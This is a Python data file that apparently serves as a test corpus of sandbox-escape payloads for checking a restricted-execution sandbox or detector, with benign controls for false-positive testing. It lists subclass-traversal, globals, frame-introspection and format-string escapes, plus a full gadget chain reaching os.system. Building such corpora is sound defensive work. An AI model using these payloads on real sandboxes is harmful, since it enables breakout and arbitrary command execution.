

PAYLOAD_CORPUS = [
    # --- subclasses_traversal ---
    {
        "code": "().__class__.__bases__[0].__subclasses__()",
        "technique": "subclasses_traversal",
        "source": "Moshe Kaplan, 'Escaping Python sandboxes'",
    },
    {
        "code": "[].__class__.__base__.__subclasses__()",
        "technique": "subclasses_traversal",
        "source": "variant -- list literal + singular __base__ instead of __bases__[0]",
    },

    # --- globals_closure_access ---
    {
        # Self-contained: defines its own throwaway lambda rather than
        # depending on some pre-existing name in scope (the earlier
        # version referenced an undefined 'harmless_function' -- fixed).
        "code": "(lambda: None).__globals__",
        "technique": "globals_closure_access",
        "source": "Moshe Kaplan, 'Escaping Python sandboxes' (adapted to be self-contained)",
    },
    {
        "code": "(lambda x=1: (lambda: x))().__closure__",
        "technique": "globals_closure_access",
        "source": "variant -- targets __closure__ specifically via a nested lambda",
    },

    # --- builtins_restoration ---
    {
        "code": "reload(__builtins__)",
        "technique": "builtins_restoration",
        "source": "Moshe Kaplan, 'Escaping Python sandboxes' (Python 2 era pattern)",
    },

    # --- frame_introspection ---
    {
        "code": "(x for x in []).gi_frame.f_back",
        "technique": "frame_introspection",
        "source": "RestrictedPython advisory GHSA-wqc8-x2pr-7jqh / CVE-2023-37271",
    },
    {
        "code": "(x for x in []).gi_frame.f_globals",
        "technique": "frame_introspection",
        "source": "variant -- targets f_globals instead of f_back",
    },

    # --- format_string_attribute_access ---
    {
        "code": '"{0.__class__.__init__.__globals__}".format(object())',
        "technique": "format_string_attribute_access",
        "source": "RestrictedPython advisory GHSA-xjw2-6jm9-rf67 / CVE-2023-41039",
    },
    {
        "code": '"{0.__class__}".format_map({"0": object()})',
        "technique": "format_string_attribute_access",
        "source": "variant -- uses format_map() instead of format()",
    },

    # --- combined chain (real-world composite attack) ---
    {
        "code": (
            "[cls for cls in object.__subclasses__() "
            "if 'os._wrap_close' in str(cls)][0]"
            ".__init__.__globals__['sys'].modules['os'].system('echo pwned')"
        ),
        "technique": "subclasses_traversal + globals_closure_access (combined)",
        "source": "pyjailbreaker README, os._wrap_close gadget chain",
    },

    # --- benign / negative examples, for false-positive testing ---
    {
        "code": "1 + 2",
        "technique": "none (benign control)",
        "source": "hand-written negative example",
    },
    {
        "code": "[i * 2 for i in range(10)]",
        "technique": "none (benign control)",
        "source": "hand-written negative example, list comprehension",
    },
]
